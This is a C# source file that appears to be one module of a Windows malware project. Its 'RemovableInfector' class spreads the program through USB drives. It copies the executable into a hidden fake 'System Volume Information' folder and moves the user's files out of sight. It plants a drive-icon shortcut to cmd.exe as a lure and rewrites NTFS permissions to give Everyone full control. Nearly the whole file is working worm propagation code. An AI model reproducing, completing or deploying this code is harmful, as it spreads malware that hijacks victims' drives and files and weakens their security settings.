using IWshRuntimeLibrary;
using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.AccessControl;
using System.Security.Principal;
using File = System.IO.File;

namespace zort
{
    public class RemovableInfector : IInfectionMethod
    {

        //kabuzo hackleyeen 3000
        private readonly ManagementEventWatcher _watcher = new ManagementEventWatcher();
        private readonly byte[] RECOGNITION_BYTES = { 0x69, 0x7A, 0x42, 0x19, 0x00, 0xCC, 0xEF, 0x42 };
        const string FAKE_FOLDER_NAME = "‎ ";
        const string FAKE_SYSTEM_VOLUME_INFO_NAME = "System Volume Information ";

        public bool RequiresAdmin => false;
        public void Start()
        {
            // Code to start the infection method
            Console.WriteLine("InfectRemovables started.");
            WatchRemovableDrives();
            InfectRemovableDrive('E');
        }
        public void Stop()
        {
            // Code to stop the infection method
            Console.WriteLine("InfectRemovables stopped.");
            UnwatchRemovableDrives();
        }

        private void WatchRemovableDrives()
        {
            // Code to watch drives for removable media
            Console.WriteLine("Watching drives for removable media...");
            _watcher.EventArrived += new EventArrivedEventHandler((object sender, EventArrivedEventArgs e) =>
            {
                // Code to handle the event when a removable drive is inserted
                Console.WriteLine("Removable drive inserted or removed.");
            });
            _watcher.Query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
            _watcher.Start();
        }

        private void UnwatchRemovableDrives()
        {
            // Code to stop watching drives
            Console.WriteLine("Stopped watching drives.");
            _watcher.Stop();
        }

        private void InfectRemovableDrive(char driveLetter)
        {
            // Code to infect the removable drive
            Console.WriteLine($"Infecting removable drive: {driveLetter}");

            string drivePath = $@"{driveLetter}:\";
            // Check if the drive is removable
            if (!DriveInfo.GetDrives().Any(d => d.Name == drivePath && d.DriveType == System.IO.DriveType.Removable)) return;

            // Check if the drive is already infected
            string driveRoot = drivePath;
            string fakeFolderPath = Path.Combine(driveRoot, FAKE_FOLDER_NAME);
            string fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
            string fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");

            if (File.Exists(fakeFilePath))
            {
                if (File.ReadAllBytes(fakeFilePath).SequenceEqual(RECOGNITION_BYTES))
                {
                    Console.WriteLine("Drive is already infected. Exiting.");
                    return;
                }
            }

            // Check if the drive is writable
            if (!CanWrite(drivePath))
            {
                Console.WriteLine("Drive is not writable. rewriting security rules");
                // Attempt to change the security rules to make it writable
                ChangeNTFSSecurityRules(drivePath);
            }
            // Check again if the drive is writable
            if (!CanWrite(drivePath))
            {
                Console.WriteLine("Drive is still not writable. Exiting.");
                return;
            }

            if (string.IsNullOrEmpty(driveRoot))
            {
                Console.WriteLine("No writable directory found.");
                return;
            }

            Console.WriteLine($"Most outer writable directory: {driveRoot}");

            // Create a fake folder in the most outer writable directory
            Directory.CreateDirectory(fakeFolderPath);
            Console.WriteLine($"Created fake folder: {fakeFolderPath}");

            // Create a fake System Volume Information folder
            Directory.CreateDirectory(fakeSystemVolumeInfoPath);
            Console.WriteLine($"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");

            //Create fake file in the fake folder
            File.WriteAllBytes(fakeFilePath, RECOGNITION_BYTES);

            // Copy the executable to the fake folder
            byte[] bytes = PersistenceHelper.CreateClone();
            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid");
            using (FileStream fs = new FileStream(clonedExecutablePath, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                fs.Write(bytes, 0, bytes.Length);
            }
            Console.WriteLine($"Copied executable to fake folder: {clonedExecutablePath}");

            // Create a shortcut to the executable
            string targetPath = $@"cmd.exe";
            string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
            CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79"); //Drive icon
            Console.WriteLine($"Created shortcut to executable: {shortcutPath}");

            // Create desktop.ini to add an icon to the fake fake folder
            string desktopIniPath = Path.Combine(fakeFolderPath, "desktop.ini");
            using (StreamWriter writer = new StreamWriter(desktopIniPath))
            {
                writer.WriteLine("[.ShellClassInfo]");
                writer.WriteLine("IconResource=C:\\Windows\\System32\\shell32.dll,79");
            }
            Console.WriteLine($"Created desktop.ini: {desktopIniPath}");

            // Set folders and files as system and hidden
            File.SetAttributes(fakeFolderPath, FileAttributes.System | FileAttributes.Hidden);
            File.SetAttributes(fakeSystemVolumeInfoPath, FileAttributes.System | FileAttributes.Hidden);
            File.SetAttributes(desktopIniPath, FileAttributes.System | FileAttributes.Hidden);
            Console.WriteLine("Set fake folders and desktop.ini as system and hidden.");

            // Move files and folders from most outer directory to the fake folder
            DirectoryInfo mostOuterDir = new DirectoryInfo(driveRoot);
            foreach (FileInfo file in mostOuterDir.GetFiles())
            {
                if (Path.GetFileName(file.FullName) == "desktop.ini") continue;
                if (Path.GetFileName(file.FullName) == "autorun.inf") continue;
                if (Path.GetExtension(file.FullName) == ".lnk") continue;
                string newPath = Path.Combine(fakeFolderPath, Path.GetFileName(file.FullName));
                File.Move(file.FullName, newPath);
            }
            foreach (DirectoryInfo directory in mostOuterDir.GetDirectories())
            {
                if (directory.FullName.Contains(FAKE_SYSTEM_VOLUME_INFO_NAME)) continue;
                if (directory.FullName.Contains(FAKE_FOLDER_NAME)) continue;
                if (directory.FullName.Contains("System Volume Information")) continue;
                string newPath = Path.Combine(fakeFolderPath, directory.Name);
                Directory.Move(directory.FullName, newPath);
            }
            Console.WriteLine("Moved files and folders to fake folder.");
        }

        private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
        {
            WshShell shell = new WshShell();
            string shortcutAddress = path;
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = description;
            shortcut.TargetPath = targetPath;
            shortcut.IconLocation = iconPath;
            shortcut.Save();
        }

        private bool CanWrite(string path)
        {
            // Check if the path is writable
            try
            {
                File.Create(Path.Combine(path, "test")).Close();
                File.Delete(Path.Combine(path, "test"));
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void ChangeNTFSSecurityRules(string drivePath)
        {
            try
            {
                Console.WriteLine($"Changing NTFS security rules for: {drivePath}");

                // Get the directory info for the drive
                DirectoryInfo directoryInfo = new DirectoryInfo(drivePath);

                // Get the current access control settings
                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

                // Remove all existing rules for the Everyone
                var rules = directorySecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));
                foreach (FileSystemAccessRule rule in rules)
                {
                    directorySecurity.RemoveAccessRule(rule);
                }

                // Add a new rule to allow full control for everyone
                FileSystemAccessRule accessRule = new FileSystemAccessRule(
                    "Everyone",
                    FileSystemRights.FullControl,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow);

                directorySecurity.AddAccessRule(accessRule);

                // Apply the updated access control settings
                directoryInfo.SetAccessControl(directorySecurity);

                Console.WriteLine("NTFS security rules updated successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to change NTFS security rules: {ex.Message}");
            }
        }
    }
}
